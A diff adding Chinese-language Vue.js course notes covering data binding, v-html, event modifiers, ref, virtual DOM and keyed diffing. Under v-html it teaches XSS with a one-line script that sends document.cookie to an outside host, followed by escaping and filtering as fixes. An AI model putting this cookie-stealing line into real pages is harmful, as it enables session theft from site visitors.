@@ -272,3 +272,156 @@
     ```
 * 事件修饰符
     * v-on:keyup.13
+
+## day2-4
+
+### 面试题
+
+### 复习
+* todolist
+    * vue
+    * bootrap
+    * 查文档
+        * 技术文档
+        * 需求
+* 数据绑定
+    * 单向
+        * {{}}
+        * v-bind
+        * v-text
+        * v-html
+            * xss攻击 xxx.com
+                * script
+                    * 点我惊喜
+                    * location.href = 'http://www.laoxie.com?x='+document.cookie
+                * 解决方案
+                    * 输入过滤
+                    * 输出转义`&lt;script&gt;` 
+    * 双向
+        * v-model
+            * 原理
+            * 替代方案
+            ```html
+                <input v-model="username"/> // input change
+
+            ```
+* 事件修饰符
+    * 指令格式：`指令:参数.修饰符=值`
+* ref
+
+### 知识点
+* 真实DOM
+    * 一个具有层级结构的节点集合
+    * 影响页面性能几大因素
+        * 节点的频繁操作
+    * 移动端很少使用jquery
+        * 移动端替代方案：zepto
+            * 手势（基于touch事件）
+    * 真实DOM节点的操作无法避免，但可以减少操作的次数
+    * ref获取真实DOM
+* VirtualDOM  虚拟DOM
+    * 一个结构类似于真实DOM的对象
+    * 格式：`{type,children,props,key}`
+    ```js
+        <div id="box">
+            <h1>1904</h1>
+            <div>
+                ...
+            </div>
+        </div>
+
+        //1.传统处理方式（3次DOM节点操作）
+        h1.innerHTML = '1904'
+        h1.innerHTML = 'h5-1904';
+        h1.innerHTML = '1904'
+
+        //2.Vue处理方式
+        let vm = new Vue({
+            data:{
+                title:1904
+            }
+        });
+
+        {{title}}
+        vm.title = 'h5-1904'
+        vm.title = '1904'
+
+        //利用diff算法，对比前后状态,找出差异，然后才更新真实DOM节点
+        //    * 如果无差异，则忽略更新
+        //    * 如果有差异，则只更新差异部分
+
+
+        vNode1 = {
+            type:'div',
+            props:{id:'#box'},
+            children:[{
+                type:'h1'
+                chidlren:'1904',
+                props:null
+            },{
+                type:'div',
+                children:[
+
+                ]
+            }]
+        }
+
+
+        vNode2 = {
+            type:'div',
+            props:{id:'#box'},
+            children:[{
+                type:'h1'
+                chidlren:'h5-1904',
+                props:null
+            },{
+                type:'div',
+                children:[
+
+                ]
+            }]
+        }
+
+
+        vNode3 = {
+            type:'div',
+            props:{id:'#box'},
+            children:[{
+                type:'h1'
+                chidlren:'1904',
+                props:null
+            },{
+                type:'ul',
+                children:[
+                    {
+                        type:'li',
+                        key:0
+                    },
+                     {
+                        type:'li',
+                        key:1
+                    },
+                     {
+                        type:'li',
+                        key:2
+                    }
+                ]
+            }]
+        }
+
+
+        //差异部分
+        diffNode = {
+            type:'h1',
+            children:'xxxx'
+        }
+
+    ```
+    * diff算法
+    * key（key必须唯一且稳定）
+        * 如果无key，为了性能优化，Vue会最大程度去复用元素
+        * 对于相同类型的兄弟元素，一般会添加key属性
+        * 什么时候需要添加key
+            * v-for生成的同类型兄弟元素需要添加key
+
+* 
